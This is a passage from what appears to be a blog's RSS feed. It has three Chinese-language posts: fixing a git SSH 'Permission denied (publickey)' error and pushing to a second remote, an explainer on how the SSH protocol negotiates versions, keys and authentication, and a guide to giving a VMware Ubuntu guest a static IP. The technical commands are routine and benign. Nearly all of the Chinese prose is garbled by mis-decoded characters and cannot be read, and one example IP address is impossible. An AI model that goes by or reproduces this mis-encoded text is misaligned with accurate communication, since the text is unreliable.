fatal: Could not read from remote repository.
Please make sure you have the correct access rights
and the repository exists.
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Solution:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Testing: &lt;code>$ssh -T git@github.com&lt;/code>
If there is a mistake about: &lt;code>Permission Dnied(publickey)&lt;/code>, this is because your new private key is not fit with the public key in the server.&lt;/li>
&lt;li>Input: &lt;code>$ssh-agent&lt;/code>, after that, you can input&lt;code>ssh-add ~/.ssh/id_key&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="fatal-could-not-read-from-remote-repository">fatal: Could not read from remote repository.&lt;/h3>
&lt;pre>&lt;code class="language-bash">â workspace_config git:(document) git push origin document
Permission denied (publickey).
fatal: Could not read from remote repository.
Please make sure you have the correct access rights
and the repository exists.
&lt;/code>&lt;/pre>
&lt;hr>
&lt;h1 id="å³èä¸¤ä¸ªrepä¸ä¸ªå¼årepoä¸ä¸ªreleaseçrepo">å³èä¸¤ä¸ªRep:ä¸ä¸ªå¼årepoï¼ä¸ä¸ªreleaseçrepo&lt;/h1>
&lt;h2 id="ä½¿ç¨åºæ¯">ä½¿ç¨åºæ¯&lt;/h2>
&lt;p>å¢éå¨ä¸ä¸ª&lt;code>private&lt;/code>çä»åº(repo1)ä¸­è¿è¡é¡¹ç®çå¼å, ä½æ¯å¨å¼åçæä¸ä¸ªè¿åº¦çæ¶åï¼æ³å°è¿ä¸ä¸ªçæ¬åå¸åºå»ï¼è¿å°±éè¦å»ºç«å¦å¤ä¸ä¸ª&lt;code>repo2&lt;/code>æ¥ç®¡çåå¸çé¡¹ç®ãæä»¬æ³å®ç°è½å¤å¨å¼åç&lt;code>repo1&lt;/code>éé¢æ·»å ç´æ¥å°&lt;code>code&lt;/code> push å° &lt;code>repo2&lt;/code>éé¢å»ãã&lt;/p>
&lt;h2 id="æä½å½ä»¤ä»ç»-2">æä½å½ä»¤ä»ç»&lt;/h2>
&lt;p>åæ£æ¥èªå·±å½åçè¿ç¨åæ¯&lt;/p>
&lt;pre>&lt;code class="language-bash">git remote -v
github https://github.com/zxbetter/test.git (fetch)
github https://github.com/zxbetter/test.git (push)
&lt;/code>&lt;/pre>
&lt;p>ç¶åæ·»å å¦å¤ä¸ä¸ªç®¡çé¡¹ç®åå¸ç&lt;code>repo2&lt;/code>&lt;/p>
&lt;pre>&lt;code class="language-bash">git remote add oschina https://git.oschina.net/zxbetter/test.git
&lt;/code>&lt;/pre>
&lt;p>æ³¨æï¼è¿éçåå­æç¹åºå«ï¼&lt;code>repo1&lt;/code>å¯¹åºçåå­æ¯&lt;code>github test&lt;/code>, è&lt;code>repo2&lt;/code>å¯¹åºçåå­æ¯&lt;code>oschina test&lt;/code>&lt;/p>
&lt;pre>&lt;code class="language-bash">git push oschina test
&lt;/code>&lt;/pre>
&lt;p>å³äºå³èä¸¤ä¸ªrepoçå¶ä»ç¨æ³åèåå®¢ï¼
&lt;a href="https://segmentfault.com/a/1190000011294144" target="_blank" rel="noopener">ä¸ä¸ªé¡¹ç®pushå°å¤ä¸ªè¿ç¨Gitä»åº&lt;/a>&lt;/p></description></item><item><title>SSHåè®®è§£æ</title><link>http://www.guozet.me/post/Linux-SSH-introduce/</link><pubDate>Sat, 12 May 2018 16:14:31 +0000</pubDate><guid>http://www.guozet.me/post/Linux-SSH-introduce/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>æè¿ä½¿ç¨SSHæ¥ç»éDigitalOcean VPSçæ¶åï¼ç¬¬ä¸æ¬¡å¯¼å¥SSHçæ¶ååºç°äºä¸äºé®é¢ï¼ç±æ­¤å¯¹SSHåè®®è¯¦ç»çå­¦ä¹ äºä¸çªãå¨è¿éå¯¹èªå·±SSHçå­¦ä¹ åä¸ä¸ªå°ç»ã&lt;/p>
&lt;h1 id="åºæ¬æ¦å¿µ">åºæ¬æ¦å¿µ&lt;/h1>
&lt;h2 id="ä»ä¹æ¯ssh">ä»ä¹æ¯SSH&lt;/h2>
&lt;p>SSH(The Secure Shell)æ¯æä¸ç§å°ææä¼ è¾çæ°æ®è¿è¡å å¯ï¼è¿æ ·&amp;quot;ä¸­é´äºº&amp;quot;è¿ç§æ»å»æ¹å¼å°±ä¸å¯è½å®ç°äºï¼èä¸ä¹è½å¤é²æ­¢DNSæ¬ºéªåIPæ¬ºéªãä½¿ç¨SSHï¼è¿æä¸ä¸ªé¢å¤çå¥½å¤å°±æ¯ä¼ è¾çæ°æ®æ¯ç»è¿åç¼©çï¼æä»¥å¯ä»¥å å¿«ä¼ è¾çéåº¦ãSSHæå¾å¤åè½ï¼å®æ¢å¯ä»¥ä»£æ¿Telnetï¼åå¯ä»¥ä¸ºFTPãPopãçè³ä¸ºPPPæä¾ä¸ä¸ªå®å¨ç&amp;quot;éé&amp;rdquo;ã&lt;/p>
&lt;blockquote>
&lt;p>å®æ¹åè®®ææ¡£è¯·åè:
&lt;a href="https://www.ietf.org/rfc/rfc4251.txt" target="_blank" rel="noopener">The Secure Shell (SSH) Protocol Architecture&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h2 id="sshåºæ¬æ¡æ¶">SSHåºæ¬æ¡æ¶&lt;/h2>
&lt;p>SSHåè®®åä¸é¨åï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ä¼ è¾å±åè®®ï¼The Transport Layer Protocolï¼æä¾æå¡å¨è®¤è¯ï¼æ°æ®æºå¯æ§ï¼ä¿¡æ¯å®æ´æ§ ç­çæ¯æï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¨æ·è®¤è¯åè®®ï¼The User Authentication Protocolï¼ åä¸ºæå¡å¨æä¾å®¢æ·ç«¯çèº«ä»½é´å«ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¿æ¥åè®®ï¼The Connection Protocolï¼ å°å å¯çä¿¡æ¯é§éå¤ç¨æè¥å¹²ä¸ªé»è¾ééï¼æä¾ç»æ´é«å±çåºç¨åè®®ä½¿ç¨ï¼ åç§é«å±åºç¨åè®®å¯ä»¥ç¸å¯¹å°ç¬ç«äºSSHåºæ¬ä½ç³»ä¹å¤ï¼å¹¶ä¾é è¿ä¸ªåºæ¬æ¡æ¶ï¼éè¿è¿æ¥åè®®ä½¿ç¨SSHçå®å¨æºå¶ã&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="sshçç§é¥ç®¡ç">SSHçç§é¥ç®¡ç&lt;/h2>
&lt;p>SSHåè®®è¦æ±æ¯ä¸ä¸ªä½¿ç¨æ¬åè®®çä¸»æºé½å¿é¡»è³å°æä¸ä¸ªèªå·±çä¸»æºå¯é¥å¯¹ï¼æå¡æ¹éè¿å¯¹å®¢æ·æ¹ä¸»æºå¯é¥çè®¤è¯ä¹åï¼æè½åè®¸å¶è¿æ¥è¯·æ±ãä¸ä¸ªä¸»æºå¯ä»¥ä½¿ç¨å¤ä¸ªå¯é¥ï¼éå¯¹ä¸åçå¯é¥ç®æ³èæ¥æä¸åçå¯é¥ï¼ä½æ¯è³å°æä¸ç§æ¯å¿å¤çãSSHåè®®å³äºä¸»æºç§é¥è®¤è¯çæ¹æ¡æä¸¤ç§ã&lt;/p>
&lt;h3 id="æ¹æ¡ä¸">æ¹æ¡ä¸&lt;/h3>
&lt;p>å¨ç¬¬ä¸ç§æ¹æ¡ä¸­ï¼ä¸»æºå°èªå·±çå¬ç¨å¯é¥ååç»ç¸å³çå®¢æ·æºï¼å®¢æ·æºå¨è®¿é®ä¸»æºæ¶åä½¿ç¨è¯¥ä¸»æºçå¬å¼å¯é¥æ¥å å¯æ°æ®ï¼ä¸»æºåä½¿ç¨èªå·±çç§æå¯é¥æ¥è§£å¯æ°æ®ï¼ä»èå®ç°ä¸»æºå¯é¥è®¤è¯ï¼ç¡®å®å®¢æ·æºçå¯é èº«ä»½ãå¨å¾2ï¼aï¼ä¸­å¯ä»¥çå°ï¼ç¨æ·ä»ä¸»æºAä¸åèµ·æä½ï¼å»è®¿é®ï¼ä¸»æºBåä¸»æºCï¼æ­¤æ¶ï¼Aæä¸ºå®¢æ·æºï¼å®å¿é¡»äºåéç½®ä¸»æºBåä¸»æºCçå¬å¼å¯é¥ï¼å¨è®¿é®çæ¶åæ ¹æ®ä¸»æºåæ¥æ¥æ¾ç¸åºçå¬å¼å¯é¥ãå¯¹äºè¢«è®¿é®ä¸»æºï¼ä¹å°±æ¯æå¡å¨ç«¯ï¼æ¥è¯´ååªè¦ä¿è¯å®å¨å°å­å¨èªå·±çç§æå¯é¥å°±å¯ä»¥äºã&lt;br>
å¦å¤ï¼SSHåè®®æ¡æ¶ä¸­è¿åè®¸å¯¹ä¸»æºå¯é¥çä¸ä¸ªæä¸­å¤çï¼é£å°±æ¯é¦æ¬¡è®¿é®åè®¤è¯ãé¦æ¬¡è®¿é®åè®¤è¯æ¯æï¼å¨æå®¢æ·æºç¬¬ä¸æ¬¡è®¿é®ä¸»æºæ¶ï¼ä¸»æºä¸æ£æ¥ä¸»æºå¯é¥ï¼èåè¯¥å®¢æ·é½åæ¾ä¸ä¸ªå¬å¼å¯é¥çæ·è´ï¼è¿æ ·å¨ä»¥åçè®¿é®ä¸­åå¿é¡»ä½¿ç¨è¯¥å¯é¥ï¼å¦åä¼è¢«è®¤ä¸ºéæ³èæç»å¶è®¿é®ã
&lt;img src="http://www.guozet.me/images/in-post/2018-05-21SSH%E4%B8%BB%E6%9C%BA%E7%A7%98%E9%92%A5%E8%AE%A4%E8%AF%81%E6%96%B9%E6%A1%88%E4%B8%80.png" alt="2018-05-21SSHä¸»æºç§é¥è®¤è¯æ¹æ¡ä¸">&lt;/p>
&lt;h3 id="æ¹æ¡äº">æ¹æ¡äº&lt;/h3>
&lt;p>ç¬¬äºç§æ¹æ¡ä¸­ï¼å­å¨ä¸ä¸ªå¯é¥è®¤è¯ä¸­å¿ï¼ææç³»ç»ä¸­æä¾æå¡çä¸»æºé½å°èªå·±çå¬å¼å¯é¥æäº¤ç»è®¤è¯ä¸­å¿ï¼èä»»ä½ä½ä¸ºå®¢æ·æºçä¸»æºååªè¦ä¿å­ä¸ä»½è®¤è¯ä¸­å¿çå¬å¼ å¯é¥å°±å¯ä»¥äºãå¨è¿ç§æ¨¡å¼ä¸ï¼å®¢æ·æºå¨è®¿é®æå¡å¨ä¸»æºä¹åï¼è¿å¿é¡»åå¯é¥è®¤è¯ä¸­å¿è¯·æ±è®¤è¯ï¼è®¤è¯ä¹åæè½å¤æ­£ç¡®å°è¿æ¥å°ç®çä¸»æºä¸ã&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2018-05-21SSH%E4%B8%BB%E6%9C%BA%E7%A7%98%E9%92%A5%E8%AE%A4%E8%AF%81%E6%96%B9%E6%A1%88%E4%BA%8C.png" alt="2018-05-21SSHä¸»æºç§é¥è®¤è¯æ¹æ¡äº">&lt;/p>
&lt;h2 id="sshçå·¥ä½è¿ç¨">SSHçå·¥ä½è¿ç¨&lt;/h2>
&lt;p>å¨æ´ä¸ªéè®¯è¿ç¨ä¸­ï¼ä¸ºå®ç° SSHçå®å¨è¿æ¥ï¼æå¡å¨ç«¯ä¸å®¢æ·ç«¯è¦ç»åå¦ä¸äºä¸ªé¶æ®µï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å®¢æ·ç«¯è¿æ¥å°æå¡å¨ä¸ï¼è¿è¡SSHåè®®çæ¬åå&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æå¡å¨åå®¢æ·ç«¯æä¾èªå·±çèº«ä»½è¯æåä¼è¯åæ°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¢æ·ç«¯ç»æå¡å¨åéä¸ä¸ªï¼ä¼è¯ï¼å¯é¥&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åæ¹å¯ç¨å å¯å¹¶å®ææå¡å¨è®¤è¯&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»ºç«å®å¨è¿æ¥&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æ¯ä¸ªé¶æ®µåæ¶åå°å®¢æ·ç«¯ä¸æå¡ç«¯çå¤æ¬¡äº¤äºï¼éè¿è¿äºäº¤äºè¿ç¨å®æåæ¬è¯ä¹¦ä¼ è¾ãç®æ³ååãééå å¯ç­è¿ç¨ã&lt;/p>
&lt;h3 id="å®¢æ·ç«¯è¿æ¥å°æå¡å¨ä¸è¿è¡sshåè®®çæ¬åå">å®¢æ·ç«¯è¿æ¥å°æå¡å¨ä¸ï¼è¿è¡SSHåè®®çæ¬åå&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>æå¡å¨æå¼ç«¯å£ 22ï¼ç­å¾å®¢æ·ç«¯è¿æ¥ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¢æ·ç«¯åæå¡å¨ç«¯åèµ· TCPåå§è¿æ¥è¯·æ±ï¼TCPè¿æ¥å»ºç«åï¼æå¡å¨åå®¢æ·ç«¯åéç¬¬ä¸ä¸ªæ¥æï¼åæ¬çæ¬æ å¿å­ç¬¦ä¸²ï¼æ ¼å¼ä¸ºâSSHï¼&amp;lt;ä¸»åè®®çæ¬å·&amp;gt;.&amp;lt;æ¬¡åè®®çæ¬å·&amp;gt;ï¼&amp;lt;è½¯ä»¶çæ¬å·&amp;gt;âï¼åè®®çæ¬å·ç±ä¸»çæ¬å·åæ¬¡çæ¬å·ç»æï¼è½¯ä»¶çæ¬å·ä¸»è¦æ¯ä¸ºè°è¯ä½¿ç¨ã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>è¿äºåè®®æ¯ä»¥ ASCII å­ç¬¦ä¸²(ææ)è¡¨ç¤ºï¼ä¾å¦ï¼SSH-1.5-1.2.27ï¼å¶æä¹ä¸ºSSHåè®®ï¼çæ¬å·æ¯V1.5ï¼SSH1å®ç°çæ¬ä¸º1.2.27ã&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>â telnet 165.227.65.39(æµè¯ä¸ä¸ªæå¡å¨å°å)
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
&lt;/code>&lt;/pre>
&lt;ol start="3">
&lt;li>
&lt;p>å®¢æ·ç«¯æ¶å°æ¥æåï¼è§£æè¯¥æ°æ®åï¼å¦ææå¡å¨ç«¯çåè®®çæ¬å·æ¯èªå·±çä½ï¼ä¸å®¢æ·ç«¯è½æ¯ææå¡å¨ç«¯çä½çæ¬ï¼å°±ä½¿ç¨æå¡å¨ç«¯çä½çæ¬åè®®å·ï¼å¦åä½¿ç¨èªå·±çåè®®çæ¬å·ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¢æ·ç«¯ååºæå¡å¨ä¸ä¸ªæ¥æï¼åå«äºå®¢æ·ç«¯å³å®ä½¿ç¨çåè®®çæ¬å·ãæå¡å¨æ¯è¾å®¢æ·ç«¯åæ¥ççæ¬å·ï¼å³å®æ¯å¦è½åå®¢æ·ç«¯ä¸èµ·å·¥ä½ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦æååæåï¼åè¿å¥å¯é¥åç®æ³ååé¶æ®µï¼å¦åæå¡å¨ç«¯æ­å¼ TCPè¿æ¥ã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>å¦æå®¢æ·ç«¯åæå¡å¨ç¡®å®å¶åè®®çæ¬å·æ¯å¼å®¹çï¼é£ä¹è¿æå°±ç»§ç»­è¿è¡ï¼å¦åï¼åæ¹é½å¯è½å³å®ä¸­æ­è¿æ¥ãä¾å¦ï¼å¦æä¸ä¸ªåªä½¿ç¨ SSH-1 çå®¢æ·ç«¯è¿æ¥å°ä¸ä¸ªåªä½¿ç¨ SSH-2 çæå¡å¨ä¸ï¼é£ä¹å®¢æ·ç«¯å°±ä¼æ­å¼è¿æ¥å¹¶æå°ä¸æ¡éè¯¯æ¶æ¯ãå®éä¸è¿å¯è½æ§è¡å¶ä»æä½ï¼ä¾å¦ï¼åªä½¿ç¨SSH-2çæå¡å¨å¯ä»¥è°ç¨SSH-1æå¡å¨æ¥å¤çè¿æ¬¡è¿æ¥è¯·æ±ã&lt;/p>
&lt;/blockquote>
&lt;p>Noteï¼ çæ¬å·ååé¶æ®µæ¥æé½æ¯éç¨æææ¹å¼ä¼ è¾çã&lt;br>
åè®®çæ¬å·äº¤æ¢è¿ç¨ä¸æ¦å®æï¼å®¢æ·ç«¯åæå¡å¨é½ç«å³ä»ä¸å±ç TCP è¿æ¥åæ¢å°åºäºå­æ¥æçåè®®ãæ¯ä¸ªæ¥æé½åå«ä¸ä¸ª32ä½çå­æ®µï¼1 - 8å­èçå¡«åä½[ ç¨æ¥é²æ­¢å·²ç¥æææ»å»unknown-plaintext attack ]ï¼ä¸ä¸ª1å­èçæ¥æç±»åä»£ç , æ¥ææææ°æ®åä¸ä¸ª4å­èçå®æ´æ§æ£æ»å­æ®µã&lt;/p>
&lt;h3 id="æå¡å¨åå®¢æ·ç«¯æä¾èªå·±çèº«ä»½è¯æåä¼è¯åæ°">æå¡å¨åå®¢æ·ç«¯æä¾èªå·±çèº«ä»½è¯æåä¼è¯åæ°&lt;/h3>
&lt;p>æå¡å¨åå®¢æ·ç«¯åéä»¥ä¸ä¿¡æ¯(ç°å¨è¿æ²æå å¯):&lt;/p>
&lt;p>ä¸»æºå¯é¥ï¼Host Keyï¼ï¼ç¨äºåé¢è¯ææå¡å¨ä¸»æºçèº«ä»½
æå¡å¨å¯é¥ï¼Server Keyï¼ï¼ç¨æ¥å¸®å©å»ºç«å®å¨è¿æ¥
8ä¸ªéæºå­èåºåï¼ç§°ä¸ºæ£æµå­èï¼check bytes)ãå®¢æ·ç«¯å¨ä¸ä¸æ¬¡ååºä¸­å¿é¡»åæ¬è¿äºæ£æµå­èï¼å¦åæå¡å¨å°±ä¼æç»æ¥æ¶ååºä¿¡æ¯ï¼è¿ç§æ¹æ³å¯ä»¥é²æ­¢æäº IPä¼ªè£æ»å»(IP spoofing attack)ã
è¯¥æå¡å¨æ¯æçå å¯ãåç¼©åè®¤è¯æ¹æ³
æ­¤æ¶ï¼åæ¹é½è¦è®¡ç®ä¸ä¸ªéç¨ç 128 ä½ä¼è¯æ è¯ç¬¦(Session ID)ãå®å¨æäºåè®®ä¸­ç¨æ¥æä¸æ è¯è¿ä¸ª SSH ä¼è¯ãè¯¥å¼æ¯ ä¸»æºå¯é¥ï¼Host Keyï¼ãæå¡å¨å¯é¥ï¼Server Keyï¼åæ£æµå­èï¼check bytes)ä¸èµ·åºç¨ MD5æ£åå½æ° å¾å°çç»æã&lt;/p>
&lt;p>å½å®¢æ·ç«¯æ¥æ¶å° ä¸»æºå¯é¥ï¼Host Keyï¼æ¶ï¼å®è¦è¿è¡è¯¢é®ï¼âä¹åæåè¿ä¸ªæå¡å¨éä¿¡è¿åï¼å¦æéä¿¡è¿ï¼é£ä¹å®çä¸»æºå¯é¥æ¯ä»ä¹å¢ï¼âè¦åç­è¿ä¸ªé®é¢ï¼å®¢æ·ç«¯å°±è¦æ»éèªå·±çå·²ç¥åä¸»æºæ°æ®åºãå¦ææ°è¿å°è¾¾çä¸»æºå¯é¥å¯ä»¥åæ°æ®åºä¸­ä»¥åçä¸ä¸ªå¯é¥å¹ï¼é£ä¹å°±æ²¡æé®é¢äºã&lt;/p>
&lt;p>ä½æ¯ï¼æ­¤æ¶è¿å­å¨ä¸¤ç§å¯è½ï¼å·²ç¥åä¸»æºæ°æ®åºä¸­æ²¡æè¿ä¸ªæå¡å¨ï¼ä¹å¯è½æè¿ä¸ªæå¡å¨ä½æ¯å¶ä¸»æºå¯é¥ä¸åãå¨è¿ä¸¤ç§æåµä¸­ï¼å®¢æ·ç«¯è¦éæ©æ¯ä¿¡ä»»è¿ä¸ªæ°è¿å°è¾¾çå¯é¥è¿æ¯æç»æ¥åè¯¥å¯é¥ãæ­¤æ¶å°±éè¦äººçæå¯¼åä¸äºï¼ä¾å¦ï¼å®¢æ·ç«¯ç¨æ·å¯è½è¢«æç¤ºè¦æ±ç¡®å®æ¯æ¥åè¿æ¯æç»è¯¥å¯é¥ã&lt;/p>
&lt;pre>&lt;code>The authenticity of host 'ssh-server.example.com (12.18.429.21)' can't be established.
RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.
Are you sure you want to continue connecting (yes/no)?
&lt;/code>&lt;/pre>
&lt;p>å¦æå®¢æ·ç«¯æç»æ¥åè¿ä¸ªä¸»æºå¯é¥ï¼é£ä¹è¿æ¥å°±ä¸­æ­¢äºãè®©æä»¬åè®¾å®¢æ·ç«¯æ¥åè¯¥å¯é¥ï¼ç°å¨ç»§ç»­ä»ç»ã&lt;/p>
&lt;ol>
&lt;li>
&lt;p>å®¢æ·ç«¯åæå¡å¨ç«¯åéè®¤è¯è¯·æ±ï¼è®¤è¯è¯·æ±ä¸­åå«ç¨æ·åãè®¤è¯æ¹æ³ãä¸è¯¥è®¤è¯æ¹æ³ç¸å³çåå®¹ï¼å¦ï¼passwordè®¤è¯æ¶ï¼åå®¹ä¸ºå¯ç ï¼ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æå¡å¨ç«¯å¯¹å®¢æ·ç«¯è¿è¡è®¤è¯ï¼å¦æè®¤è¯å¤±è´¥ï¼ååå®¢æ·ç«¯åéè®¤è¯å¤±è´¥æ¶æ¯ï¼å¶ä¸­åå«å¯ä»¥åæ¬¡è®¤è¯çæ¹æ³åè¡¨ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å®¢æ·ç«¯ä»è®¤è¯æ¹æ³åè¡¨ä¸­éåä¸ç§è®¤è¯æ¹æ³åæ¬¡è¿è¡è®¤è¯ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¯¥è¿ç¨åå¤è¿è¡ï¼ ç´å°è®¤è¯æåæèè®¤è¯æ¬¡æ°è¾¾å°ä¸éï¼ æå¡å¨å³é­è¿æ¥ä¸ºæ­¢ã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>SSHæä¾ä¸¤ç§è®¤è¯æ¹å¼ï¼&lt;/p>
&lt;ol>
&lt;li>passwordè®¤è¯ï¼å®¢æ·ç«¯åæå¡å¨ååº passwordè®¤è¯è¯·æ±ï¼å°ç¨æ·ååå¯ç å å¯ååéç»æå¡å¨ï¼æå¡å¨å°è¯¥ä¿¡æ¯è§£å¯åå¾å°ç¨æ·ååå¯ç çææï¼ä¸è®¾å¤ä¸ä¿å­çç¨æ·ååå¯ç è¿è¡æ¯è¾ï¼å¹¶è¿åè®¤è¯æåæå¤±è´¥çæ¶æ¯ã&lt;/li>
&lt;li>publickey è®¤è¯ï¼éç¨æ°å­ç­¾åçæ¹æ³æ¥è®¤è¯å®¢æ·ç«¯ãç®åï¼è®¾å¤ä¸å¯ä»¥å©ç¨RSAå DSAä¸¤ç§å¬å±å¯é¥ç®æ³å®ç°æ°å­ç­¾åãå®¢æ·ç«¯åéåå«ç¨æ·åãå¬å±å¯é¥åå¬å±å¯é¥ç®æ³ç publickey è®¤è¯è¯·æ±ç»æå¡å¨ç«¯ãæå¡å¨å¯¹å¬é¥è¿è¡åæ³æ§æ£æ¥ï¼å¦æä¸åæ³ï¼åç´æ¥åéå¤±è´¥æ¶æ¯ï¼å¦åï¼æå¡å¨å©ç¨æ°å­ç­¾åå¯¹å®¢æ·ç«¯è¿è¡è®¤è¯ï¼å¹¶è¿åè®¤è¯æåæå¤±è´¥çæ¶æ¯&lt;/li>
&lt;/ol>
&lt;p>SSH2.0è¿æä¾äº password-publickey è®¤è¯å any è®¤è¯:&lt;/p>
&lt;ol>
&lt;li>password-publickey è®¤è¯ï¼æå®è¯¥ç¨æ·çè®¤è¯æ¹å¼ä¸º password å publickeyè®¤è¯åæ¶æ»¡è¶³ãå®¢æ·ç«¯çæ¬ä¸º SSH1çç¨æ·åªè¦éè¿å¶ä¸­ä¸ç§è®¤è¯å³å¯ç»å½ï¼å®¢æ·ç«¯çæ¬ä¸º SSH2çç¨æ·å¿é¡»ä¸¤ç§è®¤è¯é½éè¿æè½ç»å½ã&lt;/li>
&lt;li>anyè®¤è¯ï¼æå®è¯¥ç¨æ·çè®¤è¯æ¹å¼å¯ä»¥æ¯ passwordï¼ä¹å¯ä»¥æ¯ publickeyã&lt;/li>
&lt;/ol>
&lt;/blockquote></description></item><item><title>å¨VMwareåæå»ºä¸ä¸ªå¤ç½å¯ä»¥è®¿é®çUbuntuæå¡å¨</title><link>http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/</link><pubDate>Sat, 12 May 2018 01:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>æ¯æ¬¡ä½¿ç¨å­¦æ ¡Labçæ¶åï¼é½ä¼æå¨éè¦å®è£è½¯ä»¶æèæ´æ°è½¯ä»¶çæ¶åï¼ç±äºæ²¡æRootæéèå¯¼è´èªå·±éè¦éæ°æ³åæ³å¤çï¼æèæ¢å°VPSä¸å»å¤ççæåµåçãæ¯å½è¿ä¸ªæ¶åï¼é½å¨èèï¼æ¯å¦å¯ä»¥å¨VMä¸­æå»ºä¸ä¸ªèªå·±å¨ä»»ä½å°æ¹é½å¯ä»¥è®¿é®çæå¡å¨ï¼&lt;/p>
&lt;h1 id="è§£å³æ¹æ¡">è§£å³æ¹æ¡&lt;/h1>
&lt;h2 id="è®¾ç½®éæipå°å">è®¾ç½®éæIPå°å&lt;/h2>
&lt;p>èæ¯&lt;/p>
&lt;p>å¨èææºä¸è¿è¡æä½ç³»ç»ï¼å°¤å¶æ¯Linuxç³»ç»å·²ç»æ¯éå¸¸å¸¸è§çåæ³ãææ¶ä½ æ³å¨èææºä¸æ­å»ºä¸ä¸ª(æ¨¡æ)æå¡å¨æ¥ä¾ä¸»æºè®¿é®ï¼æ¯å¦æ­å»ºä¸ä¸ªtelnet/sshãæ­¤æ¶ä½ ä¼åç°ï¼æ¯æ¬¡å¯å¨èææºï¼VMWareä¸ºèææºç³»ç»åéä¸ä¸ªå¨æIPï¼è¿æ ·æ¯æ¬¡å»è¿æ¥èææºçtelnetæ¶å¾ä¸æ¹ä¾¿ãå¦æè®¾æéæIPå°±å¥½äºã&lt;/p>
&lt;p>VMnet8åNAT&lt;/p>
&lt;p>å¦æä½ çèææºæ¯ä»¥NATæ¹å¼è¿å¥äºèç½çè¯ï¼é£ä¹èææºçIPå°åééï¼ç½å³ä»¥åäºèç½è®¿é®æéåç±VMWareæä¾çå«åVMnet8èæç½å¡ææä¾ãæä»¥ä¸ååè®¾ç½®éæIPæå³çè®¾ç½®é½å¯ä»¥ä»è¿éæ¾å°ãéVMnet8èæç½å¡ï¼ä¸»æºå¯ä»¥è®¿é®èææºçIPï¼èææºå¯ä»¥è¿å¥ä¸»æºçäºèç½è¿æ¥è¿å¥å¤ç½ã&lt;/p>
&lt;p>ç¡®è®¤VMnet8èæç½å¡å·²å¯ç¨&lt;/p>
&lt;p>å¨é»è®¤æåµä¸ï¼VMWare Workstationå·²ç»å¯ç¨VMnet8èæç½å¡ï¼Windows 7ä¸ï¼éè¿è¿å¥ æ§å¶é¢æ¿&amp;gt;ç½ç»åInternet&amp;gt;ç½ç»åå±äº«ä¸­å¿&amp;gt;æ´æ¹ééå¨è®¾ç½® å¯ä»¥æ¥çè¯¥èæç½å¡çç¶æãå¦å¾1-1æç¤ºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20NATNetworkInformation.png" alt="2018-05-20 NAT network information">&lt;/p>
&lt;p>å¾å°å¯ç¨IPèå´ãç½å³åå­ç½æ©ç &lt;/p>
&lt;p>å¨VMWareä¸»çé¢ï¼ç¹å»Edit&amp;gt;Virtual Network Editorèåè¿å¥èæç½å¡åæ°è®¾ç½®çé¢ï¼å¾1-2ï¼ãéæ©VMnet8æ¡ç®ï¼ç¹å»NAT Settingsæé®åå¯ä»¥çå°æä»¬çVMWare Workstationä¸ºNATè¿æ¥çèææºè®¾å®çé»è®¤ç½å³ï¼æ­¤å¤ä¸º192.168.91.2ï¼ä»¥åå­ç½æ©ç ï¼æ­¤å¤ä¸º255.255.255.0, å¦å¾1-3æç¤ºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/getSomeIpaddressWhichYouCanUse.png" alt="Get some ipaddress which you can use">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20.png" alt="2018-05-20 ">
ç¹å»DHCP Settingsæé®ï¼å¯ä»¥çå°VMnet8ä¸ºèææºåéçå¯ç¨çå­ç½IPèå´ï¼å¦å¾1-4æç¤ºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20%E5%8F%AF%E7%94%A8%E7%9A%84IP%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4.png" alt="2018-05-20å¯ç¨çIPå°åèå´">&lt;/p>
&lt;p>å¨è¿éï¼æä»¬å¯ä»¥å¾å°
OKï¼è³æ­¤ï¼æææä»¬éè¦çä¿¡æ¯é½å·²ç»è·åå°ï¼è¿éæ±æ»ä¸ä¸ï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å­ç½IPå¯ç¨èå´ï¼192.168.91.128~192.168.91.254&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å­ç½æ©ç ï¼255.255.255.0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç½å³: 192.168.91.2&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ä¸é¢å¼å§è¿å¥Ubuntuèææºè®¾ç½®éæIPã&lt;/p>
